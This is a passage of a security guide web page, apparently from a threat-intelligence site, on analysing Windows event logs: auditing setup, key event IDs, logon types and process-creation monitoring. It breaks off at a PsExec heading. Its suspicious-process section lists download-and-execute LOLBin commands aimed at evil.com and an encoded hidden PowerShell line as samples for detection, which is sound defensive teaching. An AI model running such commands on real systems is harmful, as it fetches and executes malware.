<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- SEO Meta Tags -->
    <title>Windows Event Log Analysis: Critical Event IDs Cheat Sheet [2025] | TheHGTech</title>
    <meta name="description"
        content="üîç Master Windows Security logs for threat detection. Event ID 4624, 4625, 4688 explained. PowerShell queries + downloadable cheat sheet included.">
    <meta name="keywords"
        content="Windows Event Log, Event ID 4624, Event ID 4625, security monitoring, threat detection, SIEM, PowerShell event analysis, Windows security logs, incident response">
    <meta name="author" content="TheHGTech">
    <meta name="robots" content="index, follow">
    <link rel="canonical" href="https://thehgtech.com/guides/windows-event-log-analysis.html">

    <!-- Open Graph -->
    <meta property="og:title" content="Windows Event Log Analysis: Critical Event IDs [2025]">
    <meta property="og:description"
        content="Master Windows Security logs for threat detection. Event ID cheat sheet included.">
    <meta property="og:type" content="article">
    <meta property="og:url" content="https://thehgtech.com/guides/windows-event-log-analysis.html">
    <meta property="og:image" content="https://thehgtech.com/images/guides/windows-event-log-analysis.png">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Windows Event Log Analysis [2025]">
    <meta name="twitter:description" content="Critical Event IDs & PowerShell queries for threat detection.">

    <!-- FAQ Schema for Rich Snippets -->
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "FAQPage",
      "mainEntity": [
        {
          "@type": "Question",
          "name": "What are the most important Windows Event IDs for security?",
          "acceptedAnswer": {
            "@type": "Answer",
            "text": "Top 10 critical Event IDs: 4624 (successful logon), 4625 (failed logon), 4688 (process creation), 4672 (special privileges assigned), 4720 (user created), 4728/4732 (group membership changes), 4697 (service installed), 4698 (scheduled task created), 4776 (NTLM authentication). Enable command-line logging for 4688."
          }
        },
        {
          "@type": "Question",
          "name": "What is the difference between Event ID 4624 logon types?",
          "acceptedAnswer": {
            "@type": "Answer",
            "text": "Key logon types: Type 2 (Interactive) = console login. Type 3 (Network) = SMB, WMI - common for lateral movement. Type 4 (Batch) = scheduled tasks. Type 7 (Unlock) = workstation unlock. Type 10 (RemoteInteractive) = RDP. Type 10 from an internal IP is normal; from external is suspicious."
          }
        },
        {
          "@type": "Question",
          "name": "How do I enable Windows command line logging?",
          "acceptedAnswer": {
            "@type": "Answer",
            "text": "Via GPO: Computer Configuration ‚Üí Administrative Templates ‚Üí System ‚Üí Audit Process Creation ‚Üí 'Include command line in process creation events' = Enabled. Also enable: auditpol /set /subcategory:'Process Creation' /success:enable. This adds full command lines to Event ID 4688."
          }
        },
        {
          "@type": "Question",
          "name": "What Windows logs should I forward to my SIEM?",
          "acceptedAnswer": {
            "@type": "Answer",
            "text": "Minimum: Security log (authentication, process creation), System log (services, drivers), PowerShell Operational log, Sysmon if deployed. Recommended: WMI Activity, TaskScheduler, Windows Defender, Firewall logs. Filter high-volume noise like 4624 Logon Type 3 from known service accounts."
          }
        }
      ]
    }
    </script>

    <!-- Structured Data -->
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "TechArticle",
      "headline": "Windows Event Log Analysis: Critical Event IDs Cheat Sheet [2025]",
      "description": "Complete guide to Windows Event Log analysis for security professionals. Critical Event IDs, PowerShell analysis, and threat detection techniques.",
      "author": {
        "@type": "Organization",
        "name": "TheHGTech"
      },
      "publisher": {
        "@type": "Organization",
        "name": "TheHGTech",
        "url": "https://thehgtech.com"
      },
      "datePublished": "2025-12-17",
      "dateModified": "2026-01-09",
      "mainEntityOfPage": "https://thehgtech.com/guides/windows-event-log-analysis.html",
      "articleSection": "Security Guides",
      "keywords": ["Windows Events", "Security Monitoring", "Threat Detection", "SIEM"]
    }
    </script>

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="/header.css">
    <link rel="stylesheet" href="/header-dropdown.css?v=1">
    <link rel="stylesheet" href="/print.css">
    <link rel="stylesheet" href="/light-mode.css">
    <link rel="stylesheet" href="/interaction-bar.css?v=20251207-0041">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-primary: #000000;
            --bg-secondary: #0a0a0a;
            --bg-card: rgba(255, 255, 255, 0.03);
            --accent-cyan: #00D9FF;
            --accent-red: #FF3D3D;
            --accent-green: #10b981;
            --accent-orange: #f59e0b;
            --accent-blue: #3B82F6;
            --accent-blue: #3b82f6;
            --text-primary: #ffffff;
            --text-secondary: #a0a0a0;
            --text-muted: #666666;
            --border: rgba(255, 255, 255, 0.1);
        }

        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.7;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 2rem;
        }

        .guide-header {
            padding: 3rem 0 2rem;
            border-bottom: 1px solid var(--border);
            margin-bottom: 3rem;
            margin-top: 60px;
        }

        h1 {
            font-size: 2.5rem;
            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 1rem;
        }

        h2 {
            color: var(--accent-cyan);
            margin: 2.5rem 0 1rem;
            font-size: 1.8rem;
            padding-top: 1rem;
            border-top: 1px solid var(--border);
        }

        h3 {
            color: var(--text-primary);
            margin: 1.5rem 0 1rem;
            font-size: 1.3rem;
        }

        h4 {
            color: var(--accent-blue);
            margin: 1.25rem 0 0.75rem;
            font-size: 1.1rem;
        }

        p {
            margin-bottom: 1rem;
            color: var(--text-secondary);
        }

        ul,
        ol {
            margin-left: 2rem;
            margin-bottom: 1rem;
            color: var(--text-secondary);
        }

        li {
            margin-bottom: 0.5rem;
        }

        .info-box {
            background: rgba(0, 217, 255, 0.05);
            border-left: 4px solid var(--accent-cyan);
            padding: 1.5rem;
            margin: 2rem 0;
            border-radius: 8px;
        }

        .warning-box {
            background: rgba(255, 76, 76, 0.05);
            border-left: 4px solid var(--accent-red);
            padding: 1.5rem;
            margin: 2rem 0;
            border-radius: 8px;
        }

        .success-box {
            background: rgba(16, 185, 129, 0.05);
            border-left: 4px solid var(--accent-green);
            padding: 1.5rem;
            margin: 2rem 0;
            border-radius: 8px;
        }

        code {
            background: var(--bg-card);
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            color: var(--accent-cyan);
            font-size: 0.9rem;
        }

        pre {
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 1.5rem;
            overflow-x: auto;
            margin: 1.5rem 0;
        }

        pre code {
            background: none;
            padding: 0;
            color: var(--accent-green);
        }

        .back-link {
            display: inline-block;
            margin-bottom: 2rem;
            color: var(--accent-cyan);
            text-decoration: none;
        }

        .back-link:hover {
            text-decoration: underline;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 1.5rem 0;
            background: var(--bg-card);
            border-radius: 8px;
            overflow: hidden;
        }

        th,
        td {
            padding: 1rem;
            text-align: left;
            border-bottom: 1px solid var(--border);
        }

        th {
            background: rgba(0, 217, 255, 0.1);
            color: var(--accent-cyan);
            font-weight: 600;
        }

        td {
            color: var(--text-secondary);
        }

        .event-id {
            display: inline-block;
            background: rgba(59, 130, 246, 0.2);
            color: var(--accent-blue);
            padding: 0.25rem 0.5rem;
            border-radius: 4px;
            font-family: monospace;
            font-weight: 600;
        }

        .severity-critical {
            color: var(--accent-red);
        }

        .severity-high {
            color: var(--accent-orange);
        }

        .severity-medium {
            color: var(--accent-cyan);
        }

        .severity-low {
            color: var(--accent-green);
        }

        .toc {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 2rem 0;
        }

        .toc h3 {
            margin-top: 0;
            color: var(--accent-cyan);
        }

        .toc ul {
            list-style: none;
            margin-left: 0;
        }

        .toc li {
            margin-bottom: 0.5rem;
        }

        .toc a {
            color: var(--text-secondary);
            text-decoration: none;
        }

        .toc a:hover {
            color: var(--accent-cyan);
        }

        .log-category {
            display: inline-block;
            padding: 0.25rem 0.75rem;
            border-radius: 4px;
            font-size: 0.8rem;
            font-weight: 600;
        }

        .cat-security {
            background: rgba(255, 76, 76, 0.2);
            color: #FF3D3D;
        }

        .cat-system {
            background: rgba(245, 158, 11, 0.2);
            color: #f59e0b;
        }

        .cat-application {
            background: rgba(16, 185, 129, 0.2);
            color: #10b981;
        }

        .cat-powershell {
            background: rgba(59, 130, 246, 0.2);
            color: #3b82f6;
        }

        .quick-ref {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin: 1.5rem 0;
        }

        .quick-ref-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 1rem;
        }

        .quick-ref-card h4 {
            margin-top: 0;
        }
    </style>

    <!-- Mobile Navigation CSS -->
    <link rel="stylesheet" href="/m-core.css?v=4.2">
    <link rel="stylesheet" href="/m-layout.css?v=3.2">
    <link rel="stylesheet" href="/m-components.css?v=3.0">
    <script src="/m-app.js?v=4.3" defer></script>

    <!-- ========== STRUCTURED DATA - BREADCRUMB ========== -->
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "BreadcrumbList",
      "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "name": "Home",
        "item": "https://thehgtech.com"
      }, {
        "@type": "ListItem",
        "position": 2,
        "name": "Guides",
        "item": "https://thehgtech.com/guides/"
      }, {
        "@type": "ListItem",
        "position": 3,
        "name": "Windows Event Log Analysis: Critical Event IDs Cheat Shee...",
        "item": "https://thehgtech.com/guides/windows-event-log-analysis.html"
      }]
    }
    </script>
<link rel="stylesheet" href="../ui-enhancements.css?v=20260220">

    <!-- ========== GLOBAL THEME SCRIPT ========== -->
    <script>
        // Inline theme set to avoid FOUC
        (function() {
            var savedTheme = localStorage.getItem("theme");
            if (savedTheme === "light" || (!savedTheme && window.matchMedia("(prefers-color-scheme: light)").matches)) {
                document.documentElement.setAttribute("data-theme", "light");
                document.body.classList.add("light-mode");
            }
        })();
    </script>
</head>

<body>
    <!-- Mobile Header -->
    <header class="m-header m-only">
        <div class="m-header__logo" style="display: flex; align-items: center; gap: 0.75rem;">
            <img src="../logo-dark.png" alt="TheHGTech" class="m-logo-img logo-dark"
                style="height: 28px; width: auto; margin: 0;">
            <img src="../logo-light.png" alt="TheHGTech" class="m-logo-img logo-light"
                style="height: 28px; width: auto; margin: 0;">
            <span
                style="font-size: 1.2rem; font-weight: 700; background: linear-gradient(135deg, #FF3D3D, #ff8c8c); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">TheHGTech</span>
        </div>
        <div class="m-header__actions">
            <button class="m-theme-toggle" onclick="toggleTheme()" aria-label="Toggle Theme">
                <span class="m-theme-toggle__thumb"></span>
                <span class="m-theme-toggle__stars">
                    <span class="m-theme-toggle__star"></span>
                    <span class="m-theme-toggle__star"></span>
                </span>
            </button>
            <button class="m-header__btn m-header__btn--search" data-action="search" aria-label="Search">
                <i class="fas fa-search"></i>
            </button>
        </div>
    </header>

    <!-- Bottom Navigation -->
    <nav class="m-bottom-nav m-only">
    <a href="/" class="m-bottom-nav__item">
        <i class="fas fa-home"></i>
        <span>Home</span>
    </a>
    <a href="/index.html#news" class="m-bottom-nav__item">
        <i class="fas fa-bolt"></i>
        <span>News</span>
    </a>
    <a href="/cve-tracker.html" class="m-bottom-nav__item">
        <i class="fas fa-bug"></i>
        <span>CVEs</span>
    </a>
    <a href="/ransomware-tracker.html" class="m-bottom-nav__item">
        <i class="fas fa-skull-crossbones"></i>
        <span>Ransomware</span>
    </a>
    <a href="/threat-intel.html" class="m-bottom-nav__item">
        <i class="fas fa-shield-alt"></i>
        <span>Intel</span>
    </a>
    <a href="/articles.html" class="m-bottom-nav__item">
        <i class="fas fa-newspaper"></i>
        <span>Articles</span>
    </a>
    <a href="/guides/" class="m-bottom-nav__item">
        <i class="fas fa-book"></i>
        <span>Guides</span>
    </a>
</nav>

    <!-- Header -->
    <!-- Desktop Header -->
    <header class="header" role="banner">
        <div class="header-content">
            <div class="logo">
                <a href="/index.html" style="text-decoration: none; display: flex; align-items: center; gap: 0.75rem;">
                    <img src="/logo-dark.png" alt="TheHGTech Logo" class="logo-img logo-dark">
                    <img src="/logo-light.png" alt="TheHGTech Logo" class="logo-img logo-light">
                    <span class="logo-text">TheHGTech</span>
                </a>
            </div>

            <nav class="nav nav-modern" role="navigation">
                <a href="/index.html#news">News</a>

                <!-- Intelligence Dropdown -->
                <div class="nav-dropdown">
                    <span class="nav-dropdown-trigger">
                        Intelligence
                        <span class="nav-live-badge">LIVE</span>
                        <i class="fas fa-chevron-down dropdown-arrow"></i>
                    </span>
                    <div class="nav-dropdown-panel">
                        <a href="/threat-intel.html" class="dropdown-item">
                            <div class="dropdown-item-icon intel"><i class="fas fa-satellite-dish"></i></div>
                            <div class="dropdown-item-content">
                                <div class="dropdown-item-title">Threat Intelligence <span
                                        class="dropdown-badge live">LIVE</span></div>
                                <div class="dropdown-item-desc">Live IOCs from 9 trusted feeds, updated every 4 hours
                                </div>
                            </div>
                        </a>
                        <a href="/cve-tracker.html" class="dropdown-item">
                            <div class="dropdown-item-icon cve"><i class="fas fa-bug"></i></div>
                            <div class="dropdown-item-content">
                                <div class="dropdown-item-title">CVE Tracker</div>
                                <div class="dropdown-item-desc">CISA KEV + NVD critical vulnerabilities with EPSS scores
                                </div>
                            </div>
                        </a>
                        <a href="/ransomware-tracker.html" class="dropdown-item">
                            <div class="dropdown-item-icon ransomware"><i class="fas fa-skull-crossbones"></i></div>
                            <div class="dropdown-item-content">
                                <div class="dropdown-item-title">Ransomware Tracker</div>
                                <div class="dropdown-item-desc">Track active ransomware groups and victims</div>
                            </div>
                        </a>
                    </div>
                </div>

                <!-- Resources Dropdown -->
                <div class="nav-dropdown">
                    <span class="nav-dropdown-trigger">
                        Resources
                        <i class="fas fa-chevron-down dropdown-arrow"></i>
                    </span>
                    <div class="nav-dropdown-panel">
                        <a href="/guides/" class="dropdown-item" style="background: rgba(0, 217, 255, 0.08);">
                            <div class="dropdown-item-icon guides"><i class="fas fa-book"></i></div>
                            <div class="dropdown-item-content">
                                <div class="dropdown-item-title" style="color: var(--accent-cyan);">Security Guides
                                    <span class="dropdown-badge popular">37+</span>
                                </div>
                                <div class="dropdown-item-desc">ISO 27001, NIST, SOC2, incident response & more</div>
                            </div>
                        </a>
                        
                        <a href="/workflows/" class="dropdown-item" style="background: rgba(255, 107, 53, 0.08);">
                            <div class="dropdown-item-icon" style="background: rgba(255, 107, 53, 0.15); color: #FF6B35;">
                                <i class="fas fa-cogs"></i>
                            </div>
                            <div class="dropdown-item-content">
                                <div class="dropdown-item-title" style="color: #FF6B35;">
                                    n8n Workflows
                                    <span class="dropdown-badge" style="background: #FF6B35;">NEW</span>
                                </div>
                                <div class="dropdown-item-desc">Security automation templates</div>
                            </div>
                        </a>
                        <a href="/comparisons/" class="dropdown-item">
                            <div class="dropdown-item-icon comparisons"><i class="fas fa-balance-scale"></i></div>
                            <div class="dropdown-item-content">
                                <div class="dropdown-item-title">Tool Comparisons</div>
                                <div class="dropdown-item-desc">EDR, SIEM, and security tool head-to-head reviews</div>
                            </div>
                        </a>
                        <div class="dropdown-divider"></div>
                        <a href="/articles.html" class="dropdown-item">
                            <div class="dropdown-item-icon articles"><i class="fas fa-newspaper"></i></div>
                            <div class="dropdown-item-content">
                                <div class="dropdown-item-title">Articles</div>
                                <div class="dropdown-item-desc">Latest cybersecurity news and analysis</div>
                            </div>
                        </a>
                    </div>
                </div>

                <button class="m-theme-toggle" id="themeToggle" onclick="toggleTheme()" aria-label="Toggle Theme" style="margin-left: 20px; display: inline-flex; position: relative; width: 56px; height: 28px; background: linear-gradient(135deg, #1a1a2e, #16213e); border: 1.5px solid rgba(255, 255, 255, 0.15); border-radius: 50px; cursor: pointer; transform: scale(0.9);">
            <span class="m-theme-toggle__thumb" style="position: absolute; top: 2px; left: 2px; width: 22px; height: 22px; background: linear-gradient(135deg, #c0c0c0, #e8e8e8); border-radius: 50%; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3); transition: all 0.3s ease;"></span>
        </button>
            </nav>

            <button class="mobile-menu-btn" aria-label="Toggle menu">
                <span></span>
                <span></span>
                <span></span>
            </button>
        </div>
    </header>

    <div class="container">
        <a href="/guides/" class="back-link">‚Üê Back to Guides</a>

        <div class="guide-header">
            <h1>Windows Event Log Analysis</h1>
            <p style="color: var(--text-muted); font-size: 1.1rem;">Master security event analysis for threat detection
                and incident response</p>
            <div style="margin-top: 1rem; color: var(--text-muted);">
                <span><i class="fas fa-book-open"></i> 22 min read</span> ‚Ä¢ <span><i class="fas fa-crosshairs"></i>
                    Intermediate</span> ‚Ä¢ <span><i class="far fa-calendar-alt"></i> December 2025</span>
            </div>
        </div>

        <img src="/images/guides/windows-event-log-analysis.png" alt="Windows Event Log Analysis Guide"
            class="featured-image"
            style="width: 100%; max-width: 100%; height: auto; border-radius: 12px; margin: 2rem 0; box-shadow: 0 10px 40px rgba(59, 130, 246, 0.2); border: 1px solid var(--border);" loading="lazy">

        <div class="info-box">
            <strong><i class="fas fa-lightbulb"></i> Why This Matters:</strong> Windows Event Logs are the primary
            source of truth for security
            investigations. Understanding how to analyze them is essential for SOC analysts, incident responders, and
            threat hunters.
        </div>

        <!-- Table of Contents -->
        <div class="toc">
            <h3><i class="fas fa-list-ul"></i> Table of Contents</h3>
            <ul>
                <li><a href="#fundamentals">1. Event Log Fundamentals</a></li>
                <li><a href="#critical-events">2. Critical Security Event IDs</a></li>
                <li><a href="#authentication">3. Authentication Analysis</a></li>
                <li><a href="#process-execution">4. Process Execution Monitoring</a></li>
                <li><a href="#lateral-movement">5. Lateral Movement Detection</a></li>
                <li><a href="#powershell">6. PowerShell Analysis</a></li>
                <li><a href="#queries">7. PowerShell Queries</a></li>
                <li><a href="#siem">8. SIEM Integration</a></li>
                <li><a href="#quick-reference">9. Quick Reference Card</a></li>
            </ul>
        </div>

        <h2 id="fundamentals">1. Event Log Fundamentals</h2>

        <p>Windows stores events in several log files, each serving a specific purpose. Understanding where to look is
            the first step in effective analysis.</p>

        <h3>Primary Log Locations</h3>

        <table>
            <thead>
                <tr>
                    <th>Log</th>
                    <th>Path</th>
                    <th>Purpose</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><span class="log-category cat-security">Security</span></td>
                    <td><code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></td>
                    <td>Authentication, authorization, policy changes</td>
                </tr>
                <tr>
                    <td><span class="log-category cat-system">System</span></td>
                    <td><code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></td>
                    <td>Services, drivers, system components</td>
                </tr>
                <tr>
                    <td><span class="log-category cat-application">Application</span></td>
                    <td><code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></td>
                    <td>Application-specific events</td>
                </tr>
                <tr>
                    <td><span class="log-category cat-powershell">PowerShell</span></td>
                    <td><code>Microsoft-Windows-PowerShell%4Operational.evtx</code></td>
                    <td>PowerShell script execution</td>
                </tr>
            </tbody>
        </table>

        <h3>Event Log Structure</h3>

        <p>Each Windows event contains these key fields:</p>

        <ul>
            <li><strong>Event ID:</strong> Unique identifier for the event type</li>
            <li><strong>TimeCreated:</strong> When the event occurred</li>
            <li><strong>Provider Name:</strong> Source component that generated the event</li>
            <li><strong>Level:</strong> Severity (Information, Warning, Error, Critical)</li>
            <li><strong>Computer:</strong> Hostname where the event occurred</li>
            <li><strong>Security ID:</strong> User/account associated with the event</li>
            <li><strong>Message:</strong> Human-readable description</li>
            <li><strong>EventData:</strong> Structured data specific to each event type</li>
        </ul>

        <pre><code># View event log structure in PowerShell
Get-WinEvent -LogName Security -MaxEvents 1 | Format-List *</code></pre>

        <h3>Enabling Advanced Auditing</h3>

        <p>By default, Windows logs minimal security events. Enable advanced auditing to capture detailed information:
        </p>

        <pre><code># Enable via GPO: Computer Configuration ‚Üí Windows Settings 
#  ‚Üí Security Settings ‚Üí Advanced Audit Policy Configuration

# Or via auditpol command:
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Logoff" /success:enable
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"Security Group Management" /success:enable</code></pre>

        <div class="warning-box">
            <strong><i class="fas fa-exclamation-triangle"></i> Important:</strong> Enable "Include command line in
            process creation events" via GPO to capture
            full command lines in Event ID 4688. This is critical for threat hunting.
        </div>

        <h2 id="critical-events">2. Critical Security Event IDs</h2>

        <h3>Authentication Events</h3>

        <table>
            <thead>
                <tr>
                    <th>Event ID</th>
                    <th>Description</th>
                    <th>Importance</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><span class="event-id">4624</span></td>
                    <td>Successful logon</td>
                    <td class="severity-high">High</td>
                </tr>
                <tr>
                    <td><span class="event-id">4625</span></td>
                    <td>Failed logon</td>
                    <td class="severity-critical">Critical</td>
                </tr>
                <tr>
                    <td><span class="event-id">4634</span></td>
                    <td>Logoff</td>
                    <td class="severity-medium">Medium</td>
                </tr>
                <tr>
                    <td><span class="event-id">4647</span></td>
                    <td>User initiated logoff</td>
                    <td class="severity-medium">Medium</td>
                </tr>
                <tr>
                    <td><span class="event-id">4648</span></td>
                    <td>Explicit credentials used (RunAs)</td>
                    <td class="severity-high">High</td>
                </tr>
                <tr>
                    <td><span class="event-id">4672</span></td>
                    <td>Special privileges assigned to new logon</td>
                    <td class="severity-critical">Critical</td>
                </tr>
                <tr>
                    <td><span class="event-id">4776</span></td>
                    <td>NTLM authentication (on DC)</td>
                    <td class="severity-high">High</td>
                </tr>
            </tbody>
        </table>

        <h3>Account Management Events</h3>

        <table>
            <thead>
                <tr>
                    <th>Event ID</th>
                    <th>Description</th>
                    <th>Importance</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><span class="event-id">4720</span></td>
                    <td>User account created</td>
                    <td class="severity-critical">Critical</td>
                </tr>
                <tr>
                    <td><span class="event-id">4722</span></td>
                    <td>User account enabled</td>
                    <td class="severity-high">High</td>
                </tr>
                <tr>
                    <td><span class="event-id">4724</span></td>
                    <td>Password reset attempt</td>
                    <td class="severity-high">High</td>
                </tr>
                <tr>
                    <td><span class="event-id">4728</span></td>
                    <td>Member added to security-enabled global group</td>
                    <td class="severity-critical">Critical</td>
                </tr>
                <tr>
                    <td><span class="event-id">4732</span></td>
                    <td>Member added to security-enabled local group</td>
                    <td class="severity-critical">Critical</td>
                </tr>
                <tr>
                    <td><span class="event-id">4756</span></td>
                    <td>Member added to universal security group</td>
                    <td class="severity-critical">Critical</td>
                </tr>
            </tbody>
        </table>

        <h3>Process and Object Events</h3>

        <table>
            <thead>
                <tr>
                    <th>Event ID</th>
                    <th>Description</th>
                    <th>Importance</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><span class="event-id">4688</span></td>
                    <td>New process created</td>
                    <td class="severity-critical">Critical</td>
                </tr>
                <tr>
                    <td><span class="event-id">4689</span></td>
                    <td>Process exited</td>
                    <td class="severity-low">Low</td>
                </tr>
                <tr>
                    <td><span class="event-id">4697</span></td>
                    <td>Service installed</td>
                    <td class="severity-critical">Critical</td>
                </tr>
                <tr>
                    <td><span class="event-id">4698</span></td>
                    <td>Scheduled task created</td>
                    <td class="severity-critical">Critical</td>
                </tr>
                <tr>
                    <td><span class="event-id">4663</span></td>
                    <td>Object access attempt (files, registry)</td>
                    <td class="severity-high">High</td>
                </tr>
            </tbody>
        </table>

        <h2 id="authentication">3. Authentication Analysis</h2>

        <h3>Understanding 4624 - Successful Logon</h3>

        <p>Event ID 4624 is one of the most important security events. It contains critical information about how and
            where authentication occurred.</p>

        <h4>Key Fields in 4624</h4>

        <pre><code>Subject:
    Security ID:     S-1-5-18 (SYSTEM or user performing action)
    Account Name:    WORKSTATION$
    
Logon Information:
    Logon Type:      10 (RemoteInteractive = RDP)
    Logon Process:   User32
    
New Logon:
    Security ID:     S-1-5-21-xxx (Target user SID)
    Account Name:    john.smith
    Account Domain:  CONTOSO
    Logon ID:        0x1A2B3C (Correlate with 4634 for session duration)
    
Network Information:
    Workstation Name: ATTACKERPC
    Source Network Address: 192.168.1.100
    Source Port:     52341</code></pre>

        <h4>Logon Type Reference</h4>

        <table>
            <thead>
                <tr>
                    <th>Type</th>
                    <th>Name</th>
                    <th>Description</th>
                    <th>Risk</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><code>2</code></td>
                    <td>Interactive</td>
                    <td>Console login (keyboard)</td>
                    <td class="severity-medium">Normal</td>
                </tr>
                <tr>
                    <td><code>3</code></td>
                    <td>Network</td>
                    <td>SMB, WMI, PowerShell remoting</td>
                    <td class="severity-high">Monitor</td>
                </tr>
                <tr>
                    <td><code>4</code></td>
                    <td>Batch</td>
                    <td>Scheduled tasks</td>
                    <td class="severity-medium">Normal</td>
                </tr>
                <tr>
                    <td><code>5</code></td>
                    <td>Service</td>
                    <td>Windows service start</td>
                    <td class="severity-medium">Normal</td>
                </tr>
                <tr>
                    <td><code>7</code></td>
                    <td>Unlock</td>
                    <td>Workstation unlock</td>
                    <td class="severity-low">Normal</td>
                </tr>
                <tr>
                    <td><code>9</code></td>
                    <td>NewCredentials</td>
                    <td>RunAs /netonly</td>
                    <td class="severity-high">Suspicious</td>
                </tr>
                <tr>
                    <td><code>10</code></td>
                    <td>RemoteInteractive</td>
                    <td>RDP</td>
                    <td class="severity-high">Monitor</td>
                </tr>
                <tr>
                    <td><code>11</code></td>
                    <td>CachedInteractive</td>
                    <td>Cached credentials (offline)</td>
                    <td class="severity-medium">Normal</td>
                </tr>
            </tbody>
        </table>

        <h3>Understanding 4625 - Failed Logon</h3>

        <p>Failed logons are critical for detecting brute force attacks, password spraying, and unauthorized access
            attempts.</p>

        <h4>Common Failure Codes</h4>

        <table>
            <thead>
                <tr>
                    <th>Status Code</th>
                    <th>Sub-Status</th>
                    <th>Meaning</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><code>0xC000006D</code></td>
                    <td><code>0xC000006A</code></td>
                    <td>Bad password</td>
                </tr>
                <tr>
                    <td><code>0xC000006D</code></td>
                    <td><code>0xC0000064</code></td>
                    <td>User does not exist</td>
                </tr>
                <tr>
                    <td><code>0xC0000234</code></td>
                    <td>‚Äî</td>
                    <td>Account locked out</td>
                </tr>
                <tr>
                    <td><code>0xC0000072</code></td>
                    <td>‚Äî</td>
                    <td>Account disabled</td>
                </tr>
                <tr>
                    <td><code>0xC000006E</code></td>
                    <td>‚Äî</td>
                    <td>Account restriction (hours, workstation)</td>
                </tr>
                <tr>
                    <td><code>0xC0000193</code></td>
                    <td>‚Äî</td>
                    <td>Account expired</td>
                </tr>
            </tbody>
        </table>

        <div class="info-box">
            <strong><i class="fas fa-lightbulb"></i> Detection Tip:</strong> Multiple 4625 events with Sub-Status
            <code>0xC000006A</code> (bad
            password) from different accounts but the same source IP indicates password spraying.
        </div>

        <h2 id="process-execution">4. Process Execution Monitoring</h2>

        <h3>Event ID 4688 - Process Creation</h3>

        <p>This is the gold standard for detecting malicious activity. When properly configured, it captures the full
            command line of every process.</p>

        <pre><code>Process Information:
    New Process ID:      0x1234
    New Process Name:    C:\Windows\System32\cmd.exe
    Creator Process ID:  0x5678
    Creator Process Name: C:\Windows\explorer.exe
    
    Command Line:        cmd.exe /c whoami & net user
    Token Elevation Type: TokenElevationTypeFull (UAC bypassed/admin)
    
Subject:
    Account Name:        john.smith
    Account Domain:      CONTOSO</code></pre>

        <h3>Suspicious Process Patterns</h3>

        <h4>1. LOLBins (Living Off the Land Binaries)</h4>
        <pre><code># Suspicious uses of legitimate Windows binaries
certutil.exe -urlcache -split -f http://evil.com/malware.exe
mshta.exe javascript:evil()
regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
wmic.exe process call create "powershell -enc base64..."
bitsadmin.exe /transfer job http://evil.com/malware.exe c:\temp\m.exe</code></pre>

        <h4>2. Encoded PowerShell</h4>
        <pre><code># Base64 encoded commands (-enc, -encodedcommand)
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZ...

# Detection: Look for -enc, -e, -encodedcommand with base64 string</code></pre>

        <h4>3. Unusual Parent-Child Relationships</h4>
        <pre><code># Suspicious parent ‚Üí child processes
Word.exe ‚Üí cmd.exe or powershell.exe     (Macro malware)
wmiprvse.exe ‚Üí powershell.exe            (WMI lateral movement)
svchost.exe ‚Üí cmd.exe                    (Service abuse)
explorer.exe ‚Üí mshta.exe                 (HTA malware)</code></pre>

        <h2 id="lateral-movement">5. Lateral Movement Detection</h2>

        <h3>RDP (Remote Desktop)</h3>

        <table>
            <thead>
                <tr>
                    <th>Event ID</th>
                    <th>Log</th>
                    <th>Location</th>
                    <th>Description</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><span class="event-id">4624</span></td>
                    <td>Security</td>
                    <td>Target</td>
                    <td>Logon Type 10</td>
                </tr>
                <tr>
                    <td><span class="event-id">21</span></td>
                    <td>TerminalServices-LocalSessionManager</td>
                    <td>Target</td>
                    <td>RDP session logon</td>
                </tr>
                <tr>
                    <td><span class="event-id">25</span></td>
                    <td>TerminalServices-LocalSessionManager</td>
                    <td>Target</td>
                    <td>RDP session reconnect</td>
                </tr>
                <tr>
                    <td><span class="event-id">1149</span></td>
                    <td>TerminalServices-RemoteConnectionManager</td>
                    <td>Target</td>
                    <td>RDP authentication success</td>
                </tr>
            </tbody>
        </table>

        <h3>PsExec and Remote Services</h3>

